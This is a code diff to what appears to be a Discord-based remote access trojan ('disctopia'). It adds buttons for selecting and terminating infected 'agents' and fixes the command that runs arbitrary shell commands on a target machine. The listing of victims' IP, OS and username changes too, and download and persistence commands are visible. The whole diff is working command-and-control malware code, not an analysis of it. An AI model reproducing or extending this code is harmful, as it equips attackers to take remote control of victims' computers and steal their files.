@@ -67,6 +67,25 @@ class Bot(commands.Bot):
         my_embed = discord.Embed(title=f"**Error:** {error}", color=0xFF0000)
         await ctx.reply(embed=my_embed)
 
+class InteractButton(discord.ui.View):
+    def __init__(self, inv:str, id:int):
+        super().__init__()
+        self.inv  = inv
+        self.id = id
+
+    @discord.ui.button(label="Interact", style=discord.ButtonStyle.blurple)
+    async def interactButton(self, interaction:discord.Interaction, button:discord.ui.Button):
+        global CURRENT_AGENT
+        CURRENT_AGENT = self.id
+        await interaction.response.send_message(embed=discord.Embed(title=f"Interacted with agent {self.id}", color=0x00FF00), ephemeral=True)
+
+    @discord.ui.button(label="Terminate", style=discord.ButtonStyle.red)
+    async def terminateButton(self, interaction:discord.Interaction, button:discord.ui.Button):
+        my_embed = discord.Embed(title=f"Terminating Connection With Agent#{self.id}", color=0x00FF00)
+        await interaction.response.send_message(embed=my_embed)
+        await bot.close()        
+        sys.exit()
+
 bot = Bot()
 
 @bot.hybrid_command(name = "interact", with_app_command = True, description = "Interact with an agent")
@@ -88,7 +107,7 @@ async def cmd(ctx: commands.Context):
 @bot.hybrid_command(name = "cmd", with_app_command = True, description = "Run any command on the target machine")
 @app_commands.guilds(GUILD)
 async def cmd(ctx: commands.Context, command:str):
-    if (CURRENT_AGENT == int(ID)):
+    if (int(CURRENT_AGENT) == int(ID)):
         result = disctopia.cmd(command)
         if len(result) > 4000:
             path = os.environ["temp"] +"\\response.txt"     
@@ -213,11 +232,13 @@ async def persistent(ctx: commands.Context):
 async def ls(ctx: commands.Context):
     if ctx.interaction:
          my_embed = discord.Embed(title=f"Please use **!ls** instead of the slash command", color=0xFF0000)
+         await ctx.reply(embed=my_embed)
     else:
         my_embed = discord.Embed(title=f"Agent #{ID}   IP: {disctopia.getIP()}", color=0xADD8E6)
         my_embed.add_field(name="**OS**", value=disctopia.getOS(), inline=True)
         my_embed.add_field(name="**Username**", value=disctopia.getUsername(), inline=True)
-    await ctx.reply(embed=my_embed)
+        view = InteractButton("Interact", ID)
+        await ctx.reply(embed=my_embed, view=view)
 
 @bot.hybrid_command(name = "download", with_app_command = True, description = "Download file from the target machine")
 @app_commands.guilds(GUILD)
